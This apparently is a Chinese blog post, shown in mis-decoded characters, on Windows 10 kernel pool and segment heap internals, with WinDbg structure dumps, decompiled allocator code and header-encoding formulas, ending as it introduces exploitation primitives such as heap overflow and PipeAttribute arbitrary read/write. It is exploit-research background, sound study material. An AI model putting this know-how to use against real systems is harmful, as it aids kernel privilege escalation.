<p>åœ¨win10 2004ï¼ˆè¿™ä¸€ç‰ˆæœ¬ä¹Ÿè¢«ç§°ä¸ºWin10 2020å¹´äº”æœˆæ›´æ–°ç‰ˆï¼ˆä»£å·æ˜¯20H1ï¼‰ï¼‰ ä»¥åŠä¹‹å‰æ˜¯</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨å†…æ ¸æ± ä¸­,æ‰€æœ‰<strong>å•é¡µçš„æ•°æ®å—çš„å¼€å¤´</strong>éƒ½æ˜¯ä¸€ä¸ªPOOL_HEADERç»“æ„ã€‚è¿™ä¸ªç»“æ„åŒ…å«äº†åˆ†é…å™¨å’Œtagä¿¡æ¯ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// win10 22h2</span></span><br><span class="line"><span class="number">1</span>: kd&gt; dt nt!_POOL_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PreviousSize     : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> PoolIndex        : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> BlockSize        : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> PoolType         : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> Ulong1           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> PoolTag          : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ProcessBilled    : Ptr64 _EPROCESS</span><br><span class="line">   +<span class="number">0x008</span> AllocatorBackTraceIndex : Uint2B</span><br><span class="line">   +<span class="number">0x00a</span> PoolTagHash      : Uint2B</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦çš„PoolType:NonPagedPool,PagedPool,SessionPool,NonPagedPoolNx</p>
<ul>
<li>åœ¨win8ä¸­å¼•å…¥äº†NonPagedPoolNx,å¿…é¡»ä½¿ç”¨å®ƒæ¥æ›¿ä»£NonpagedPoolç±»å‹.</li>
</ul>
<p><strong>PagedPool</strong>æ˜¯åˆ†é¡µå†…å­˜ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç‰©ç†å†…å­˜ä¸å¤Ÿæ—¶ï¼Œä¼šæŠŠè¿™ç‰‡å†…å­˜ç§»åŠ¨åˆ°ç¡¬ç›˜ä¸Šã€‚</p>
<ul>
<li>ä¸€ä¸ªç‰©ç†åœ°å€èƒ½å¯¹åº”å¤šä¸ªè™šæ‹Ÿåœ°å€</li>
</ul>
<p>è€Œ<strong>NonPagedPool</strong>æ˜¯æ— è®ºç‰©ç†å†…å­˜å¦‚ä½•ç´§ç¼ºï¼Œéƒ½ç»å¯¹ä¸æŠŠè¿™ç‰‡å†…å­˜çš„å†…å®¹ç§»åŠ¨åˆ°ç¡¬ç›˜ä¸Šã€‚åªèƒ½å¸¸é©»äºç‰©ç†å†…å­˜åœ°å€ï¼Œä¸èƒ½æ˜ å°„</p>
<p>Segment Heap â€“ æ®µå †è‡ªWindows 10 19H1å¼€å§‹ç”¨äºå†…æ ¸ç©ºé—´ï¼Œä¸ç”¨æˆ·ç©ºé—´ä¸­ä½¿ç”¨çš„æ®µå †éå¸¸ç›¸ä¼¼ã€‚å°±åƒåœ¨ç”¨æˆ·æ€ä½¿ç”¨çš„ä¸€æ ·ï¼Œæ®µå †æ˜¯ä¸ºæ ¹æ®åˆ†é…å¤§å°çš„ä¸åŒæä¾›ä¸åŒçš„åŠŸèƒ½ï¼Œä¸ºæ­¤æ¥å®šä¹‰äº†å¤šç§ä¸åŒç±»å‹çš„åç«¯å¤„ç†ã€‚  </p>
<p>win10ä¹‹åå †åˆ†ä¸ºä¸¤ç§ï¼šSegment heapå’ŒNT heapã€‚å½“ä¸€ä¸ªè¿›ç¨‹åˆ†é…å †çš„æ—¶å€™ï¼Œå¤§éƒ¨åˆ†åœºåˆé»˜è®¤ä½¿ç”¨çš„å †éƒ½æ˜¯åé¢é‚£ç§ï¼Œå‰é¢çš„segment heapé€šå¸¸ä¼šåœ¨winappæˆ–è€…æŸäº›ç‰¹æ®Šçš„è¿›ç¨‹ï¼ˆæ ¸å¿ƒè¿›ç¨‹ï¼‰ä¸­ä¼šä½¿ç”¨åˆ°ã€‚ </p>
<p>è¿™ä¸¤ç§å †ç§°ä¸ºå‰ç«¯å †ï¼ˆFrontend Heapï¼‰å’Œåç«¯å †ï¼ˆBackend Heapï¼‰</p>
<p>ä½ç¢ç‰‡å †(LFH)  &lt;&#x3D; 0x200<br>å¯å˜é‡å¤§å°åç«¯(VS)  &lt;&#x3D; 0x20000<br>åˆ†æ®µåˆ†é…(SEG)  &lt;&#x3D; 0x7f0000<br>Large</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">RtlpHpAllocateHeapInternal</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3, <span class="type">unsigned</span> <span class="type">int</span> a4, <span class="type">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v6 = a3;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; (<span class="type">unsigned</span> <span class="type">int</span>)*(<span class="type">unsigned</span> __int16 *)(a1 + <span class="number">892</span>) - <span class="number">16</span></span><br><span class="line">    || (v10 = <span class="built_in">RtlpHpLfhContextAllocate</span>(a1 + <span class="number">832</span>, a2, a3, a4), a3 = (<span class="type">unsigned</span> <span class="type">int</span>)v6, a2 = (<span class="type">unsigned</span> <span class="type">int</span>)v7, v10 == <span class="number">-1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">0x20000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &gt; *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">464</span>) )</span><br><span class="line">        v11 = <span class="built_in">RtlpHpLargeAlloc</span>(a1, v7, v6, a4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v11 = <span class="built_in">RtlpHpSegAlloc</span>((<span class="type">unsigned</span> <span class="type">int</span>)a1 + (*(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">272</span>) &lt; v6 ? <span class="number">448</span> : <span class="number">256</span>), v7, v6, v6, a4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="built_in">RtlpHpVsContextAllocate</span>(a1 + <span class="number">640</span>, a2, a3, a4);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a5 = v9;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LFH,VS,SEGåˆ†åˆ«å…³è”äº†å¯¹åº”çš„ä¸Šä¸‹æ–‡(CONTEXT)ï¼Œè¿™äº›åç«¯çš„ä¸Šä¸‹æ–‡å­˜å‚¨åœ¨<code>_SEGMENT_HEAP</code>ç»“æ„ä¸­åç§»0x100,0x280,0x340çš„ä½ç½®</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0x000</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> GlobalFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Interceptor      : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessHeapListIndex : Uint2B</span><br><span class="line">   +<span class="number">0x01e</span> AllocatedFromMetadata : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x020</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +<span class="number">0x020</span> ReservedMustBeZero1 : Uint8B</span><br><span class="line">   +<span class="number">0x028</span> UserContext      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedMustBeZero2 : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> Spare            : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> LargeMetadataLock : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x058</span> LargeReservedPages : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> LargeCommittedPages : Uint8B</span><br><span class="line">   +<span class="number">0x068</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS</span><br><span class="line">   +<span class="number">0x0d8</span> GlobalLockCount  : Uint2B</span><br><span class="line">   +<span class="number">0x0dc</span> GlobalLockOwner  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> ContextExtendLock : Uint8B</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure>

<p>ä¸åŒçš„<code>POOL_TYPE</code>,éƒ½æœ‰1ä¸ª<code>_SEGMENT_HEAP</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _POOL_TYPE</span><br><span class="line">ntdll!_POOL_TYPE</span><br><span class="line">   NonPagedPool = <span class="number">0</span>n0</span><br><span class="line">   NonPagedPoolExecute = <span class="number">0</span>n0</span><br><span class="line">   PagedPool = <span class="number">0</span>n1</span><br><span class="line">   NonPagedPoolMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   DontUseThisType = <span class="number">0</span>n3</span><br><span class="line">   NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">   NonPagedPoolCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   MaxPoolType = <span class="number">0</span>n7</span><br><span class="line">   NonPagedPoolBase = <span class="number">0</span>n0</span><br><span class="line">   NonPagedPoolBaseMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   NonPagedPoolBaseCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   NonPagedPoolBaseCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   NonPagedPoolSession = <span class="number">0</span>n32</span><br><span class="line">   PagedPoolSession = <span class="number">0</span>n33</span><br><span class="line">   NonPagedPoolMustSucceedSession = <span class="number">0</span>n34</span><br><span class="line">   DontUseThisTypeSession = <span class="number">0</span>n35</span><br><span class="line">   NonPagedPoolCacheAlignedSession = <span class="number">0</span>n36</span><br><span class="line">   PagedPoolCacheAlignedSession = <span class="number">0</span>n37</span><br><span class="line">   NonPagedPoolCacheAlignedMustSSession = <span class="number">0</span>n38</span><br><span class="line">   NonPagedPoolNx = <span class="number">0</span>n512</span><br><span class="line">   NonPagedPoolNxCacheAligned = <span class="number">0</span>n516</span><br><span class="line">   NonPagedPoolSessionNx = <span class="number">0</span>n544</span><br></pre></td></tr></table></figure>

<h5 id="Segment-Backend"><a href="#Segment-Backend" class="headerlink" title="Segment Backend"></a>Segment Backend</h5><p>SegAllocåç«¯æ˜¯ç”¨äºåˆ†é…å¤§å°åœ¨128 KBå’Œ7 GBä¹‹é—´çš„å†…å­˜å—ã€‚å®ƒä¹Ÿç”¨äºåå°ï¼Œä¸ºVSå’ŒLFHåç«¯åˆ†é…å†…å­˜ã€‚  </p>
<p>æ®µåç«¯ä¸Šä¸‹æ–‡å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º<code>_HEAP_SEG_CONTEXT</code>çš„ç»“æ„ä¸­ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> UnitShift        : UChar</span><br><span class="line">   +<span class="number">0x009</span> PagesPerUnitShift : UChar</span><br><span class="line">   +<span class="number">0x00a</span> FirstDescriptorIndex : UChar</span><br><span class="line">   +<span class="number">0x00b</span> CachedCommitSoftShift : UChar</span><br><span class="line">   +<span class="number">0x00c</span> CachedCommitHighShift : UChar</span><br><span class="line">   +<span class="number">0x00d</span> Flags            : &lt;anonymous-tag&gt;</span><br><span class="line">   +<span class="number">0x010</span> MaxAllocationSize : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> OlpStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x016</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x018</span> LfhContext       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> VsContext        : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x038</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> SegmentLock      : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x058</span> SegmentCount     : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> FreePageRanges   : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x070</span> FreeSegmentListLock : Uint8B</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>æ®µå­˜å‚¨åœ¨å­˜å‚¨åœ¨SegmentListHeadä¸­çš„é“¾è¡¨ä¸­ã€‚æ®µå¤´ä¸º<code>_HEAP_PAGE_SEGMENT</code>ï¼Œåé¢æ˜¯256ä¸ª<code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>ç»“æ„ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE</span><br><span class="line">   +<span class="number">0x020</span> UnusedWatermark  : UChar</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR</span><br></pre></td></tr></table></figure>

<p><code>_HEAP_SEG_CONTEXT</code>ä¸­è¿˜ç»´æŠ¤äº†ä¸€ä¸ªçº¢é»‘æ ‘ï¼Œè€Œ<code>_HEAP_PAGE_SEGMENT</code>ä¸­çš„Signatureæ˜¯æ¯ä¸ª<code>_HEAP_PAGE_SEGMEN</code>Téƒ½æœ‰çš„ä¸€ä¸ªç­¾åè®¡ç®—</p>
<p>è®¡ç®—æ–¹æ³•ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Signature = Segment ^ SegContext ^ RtlpHpHeapGlobals ^ <span class="number">0xA2E64EADA2E64EAD</span>;</span><br><span class="line"><span class="comment">// SegContext: æ‰€å±çš„_HEAP_SEG_CONTEXT</span></span><br><span class="line">Segment = Addr &amp; SegContext-&gt;SegmentMask;</span><br></pre></td></tr></table></figure>

<h5 id="Variable-Size-Backend"><a href="#Variable-Size-Backend" class="headerlink" title="Variable Size Backend"></a>Variable Size Backend</h5><p>å¯å˜å¤§å°åç«¯åˆ†é…512Båˆ°128KBå¤§å°çš„å—ã€‚å®ƒçš„ç›®çš„æ˜¯åœ¨æä¾›å¯¹ç©ºé—²å—çš„é‡ç”¨ã€‚å®ƒå­˜å‚¨åœ¨<code>_HEAP_VS_CONTEXT</code>ç»“æ„ä½“ä¸­ã€‚</p>
<ul>
<li>ç©ºé—²å—ä»¥<code>_HEAP_VS_CHUNK_FREE_HEADER</code>çš„ä¸“ç”¨ç»“æ„ä½“ä¸ºå¤´éƒ¨ã€‚</li>
<li>è€Œå·²ç»è¢«åˆ†é…çš„å—éƒ½ä¼šä»¥<code>_HEAP_VS_CHUNK_HEADER</code>çš„ç»“æ„ä½“å¼€å¤´ã€‚è€Œheaderç»“æ„ä½“ä¸­çš„æ‰€æœ‰å­—æ®µéƒ½ä¸RtlHpHeapGlobalså’Œå—çš„åœ°å€è¿›è¡Œå¼‚æˆ–ã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CONTEXT</span><br><span class="line">+<span class="number">0</span> x000 Lock : Uint8B</span><br><span class="line">+<span class="number">0</span> x008 LockType : _RTLP_HP_LOCK_TYPE</span><br><span class="line">+<span class="number">0</span> x010 FreeChunkTree : _RTL_RB_TREE</span><br><span class="line">+<span class="number">0</span> x020 SubsegmentList : _LIST_ENTRY</span><br><span class="line">+<span class="number">0</span> x030 TotalCommittedUnits : Uint8B</span><br><span class="line">+<span class="number">0</span> x038 FreeCommittedUnits : Uint8B</span><br><span class="line">+<span class="number">0</span> x040 DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT</span><br><span class="line">+<span class="number">0</span> x080 BackendCtx : Ptr64 Void</span><br><span class="line">+<span class="number">0</span> x088 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">+<span class="number">0</span> x0b0 Config : _RTL_HP_VS_CONFIG</span><br><span class="line">+<span class="number">0</span> x0b4 Flags : Uint4B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_HEADER</span><br><span class="line">+<span class="number">0</span> x000 Sizes : _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">+<span class="number">0</span> x008 EncodedSegmentPageOffset : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">+<span class="number">0</span> x008 UnusedBytes : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">+<span class="number">0</span> x008 SkipDuringWalk : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">+<span class="number">0</span> x008 Spare : Pos <span class="number">10</span>, <span class="number">22</span> Bits</span><br><span class="line">+<span class="number">0</span> x008 AllocatedChunkBits : Uint4B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">+<span class="number">0</span> x000 MemoryCost : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x000 UnsafeSize : Pos <span class="number">16</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x004 UnsafePrevSize : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x004 Allocated : Pos <span class="number">16</span>, <span class="number">8</span> Bits</span><br><span class="line">+<span class="number">0</span> x000 KeyUShort : Uint2B</span><br><span class="line">+<span class="number">0</span> x000 KeyULong : Uint4B</span><br><span class="line">+<span class="number">0</span> x000 HeaderBits : Uint8B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_FREE_HEADER</span><br><span class="line">+<span class="number">0</span> x000 Header : _HEAP_VS_CHUNK_HEADER</span><br><span class="line">+<span class="number">0</span> x000 OverlapsHeader : Uint8B</span><br><span class="line">+<span class="number">0</span> x008 Node : _RTL_BALANCED_NODE</span><br></pre></td></tr></table></figure>

<p>å·²è¢«åˆ†é…çš„å—éƒ½ä»¥<code>_HEAP_VS_CHUNK_HEADER</code>çš„ç»“æ„ä½“å¼€å¤´ã€‚è€Œheaderç»“æ„ä½“ä¸­çš„æ‰€æœ‰å­—æ®µéƒ½ä¸RtlHpHeapGlobalså’Œå—çš„åœ°å€è¿›è¡Œå¼‚æˆ–ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Chunk-&gt;Sizes = Chunk-&gt;Sizes ^ Chunk ^ RtlpHpHeapGlobals ;</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq ffff998533f74440 L2</span><br><span class="line">ffff9985`<span class="number">33f</span>74440  <span class="number">88</span>a74e1e`<span class="number">7e507045</span> ffff9985`<span class="number">00000049</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dt _HEAP_VS_CHUNK_HEADER ffff998533f74440</span><br><span class="line">ntdll!_HEAP_VS_CHUNK_HEADER</span><br><span class="line">   +<span class="number">0x000</span> Sizes            : _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">   +<span class="number">0x008</span> EncodedSegmentPageOffset : <span class="number">0</span>y01001001 (<span class="number">0x49</span>)</span><br><span class="line">   +<span class="number">0x008</span> UnusedBytes      : <span class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> SkipDuringWalk   : <span class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> Spare            : <span class="number">0</span>y0000000000000000000000 (<span class="number">0</span>)</span><br><span class="line">   +<span class="number">0x008</span> AllocatedChunkBits : <span class="number">0x49</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffff998520ad7080 -<span class="built_in">r1</span> (*((ntdll!_HEAP_VS_CHUNK_HEADER_SIZE *)<span class="number">0xffff998533f74440</span>))</span><br><span class="line">(*((ntdll!_HEAP_VS_CHUNK_HEADER_SIZE *)<span class="number">0xffff998533f74440</span>))                 [Type: _HEAP_VS_CHUNK_HEADER_SIZE]</span><br><span class="line">    [+<span class="number">0x000</span> (<span class="number">15</span>: <span class="number">0</span>)] MemoryCost       : <span class="number">0x7045</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span> (<span class="number">31</span>:<span class="number">16</span>)] UnsafeSize       : <span class="number">0x7e50</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x004</span> (<span class="number">15</span>: <span class="number">0</span>)] UnsafePrevSize   : <span class="number">0x4e1e</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x004</span> (<span class="number">23</span>:<span class="number">16</span>)] Allocated        : <span class="number">0xa7</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] KeyUShort        : <span class="number">0x7045</span> [Type: <span class="type">unsigned</span> <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] KeyULong         : <span class="number">0x7e507045</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] HeaderBits       : <span class="number">0x88a74e1e7e507045</span> [Type: <span class="type">unsigned</span> __int64]</span><br></pre></td></tr></table></figure>

<p>åœ¨å†…éƒ¨ï¼ŒVSåˆ†é…å™¨ä½¿ç”¨æ®µåˆ†é…å™¨ã€‚å®ƒé€šè¿‡<code>_HEAP_VS_CONTXT</code>ä¸­çš„<code>_HEAP_SUBALLOCATOR_CALLBACKS</code>å­—æ®µåœ¨<code>RtlpHpVsSubsegmentCreate</code>ä¸­ä½¿ç”¨ã€‚<strong>å­åˆ†é…å™¨å›è°ƒå‡½æ•°éƒ½ä¸VSä¸Šä¸‹æ–‡å’ŒRtlpHpHeapGlobalsåœ°å€è¿›è¡Œå¼‚æˆ–</strong>ã€‚  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">callbacks.Allocate = RtlpHpSegVsAllocate;</span><br><span class="line">callbacks.Free = RtlpHpSegLfhVsFree;</span><br><span class="line">callbacks.Commit = RtlpHpSegLfhVsCommit;</span><br><span class="line">callbacks.Decommit = RtlpHpSegLfhVsDecommit;</span><br><span class="line">callbacks.ExtendContext = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<h5 id="Low-Fragmentation-Heap-Backend"><a href="#Low-Fragmentation-Heap-Backend" class="headerlink" title="Low Fragmentation Heap Backend"></a>Low Fragmentation Heap Backend</h5><p>Low Fragmentation Heap Backendæ˜¯ä¸€ä¸ªåç«¯ï¼Œä¸“é—¨ä¸ºä»1B ~ 512 B åˆ†é…ã€‚LFHåç«¯ä¸Šä¸‹æ–‡å­˜å‚¨åœ¨_HEAP_LFH_CONTEXTçš„ç»“æ„ä½“ä¸­ã€‚LFHåç«¯çš„ä¸»è¦ç‰¹ç‚¹æ˜¯ä½¿ç”¨ä¸åŒå¤§å°çš„bucketæ¥é¿å…ç¢ç‰‡åŒ–</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_LFH_CONTEXT</span><br><span class="line">+<span class="number">0</span> x000 BackendCtx : Ptr64 Void</span><br><span class="line">+<span class="number">0</span> x008 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">+<span class="number">0</span> x030 AffinityModArray : Ptr64 UChar</span><br><span class="line">+<span class="number">0</span> x038 MaxAffinity : UChar</span><br><span class="line">+<span class="number">0</span> x039 LockType : UChar</span><br><span class="line">+<span class="number">0</span> x03a MemStatsOffset : Int2B</span><br><span class="line">+<span class="number">0</span> x03c Config : _RTL_HP_LFH_CONFIG</span><br><span class="line">+<span class="number">0</span> x040 BucketStats : _HEAP_LFH_SUBSEGMENT_STATS</span><br><span class="line">+<span class="number">0</span> x048 SubsegmentCreationLock : Uint8B</span><br><span class="line">+<span class="number">0</span> x080 Buckets : [<span class="number">129</span>] Ptr64 _HEAP_LFH_BUCKET</span><br></pre></td></tr></table></figure>

<h5 id="ç¼“å­˜å¯¹é½"><a href="#ç¼“å­˜å¯¹é½" class="headerlink" title="ç¼“å­˜å¯¹é½"></a>ç¼“å­˜å¯¹é½</h5><p>éšç€å†…æ ¸å±‚å †åˆ†é…å™¨çš„æ›´æ–°ï¼Œ<code>_POOL_HEADER</code>çš„å¤§éƒ¨åˆ†å­—æ®µéƒ½æ˜¯æ— ç”¨çš„</p>
<p>ä½†æ˜¯PoolTagå’ŒPoolTypeéƒ½æ˜¯æ¯”è¾ƒé‡è¦çš„</p>
<p>è°ƒç”¨äº†ExAllocatePoolWithTagæ—¶,å¦‚æœPoolTypeè®¾ç½®äº†CacheAligned,é‚£ä¹ˆè¿”å›çš„å†…å­˜å°†æ˜¯ä¸ç¼“å­˜è¡Œå¤§å°å¯¹é½çš„,è¿™ä¸ªå€¼å–å†³äºcpu,é€šå¸¸ä¸º0x40ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåˆ†é…çš„åœ°å€æ²¡æœ‰æ­£ç¡®çš„å¯¹é½ï¼Œé‚£ä¹ˆå—å¯èƒ½ä¼šæœ‰ä¸¤ä¸ªheadersã€‚</p>
<h4 id="Generic-Exploitation"><a href="#Generic-Exploitation" class="headerlink" title="Generic Exploitation"></a>Generic Exploitation</h4><p>å †æº¢å‡ºï¼Œå¹½çµå—ï¼Œè¿™é‡Œä»‹ç»äº†çš„æ”»å‡»æ–¹å¼ï¼Œéƒ½æ˜¯NamedPipeï¼Œåˆ†åˆ«åœ¨PagedPoolå’ŒNonPagedPoolä¸­</p>
<h5 id="PipeAttribute"><a href="#PipeAttribute" class="headerlink" title="PipeAttribute"></a>PipeAttribute</h5><p>BigPool: åˆ†é…å¿…é¡»è¶³å¤Ÿå¤§(x64ä¸Šä¸º4064+å­—èŠ‚)æ‰èƒ½åœ¨å¤§æ± ä¸­å¤„ç†</p>
<p>è®ºæ–‡ä¸­ä»‹ç»äº†PagedPoolçš„æ¯”è¾ƒå¥½ç”¨çš„ä»»æ„è¯»å†™çš„æ–¹æ³•ï¼šPipeAttribute</p>
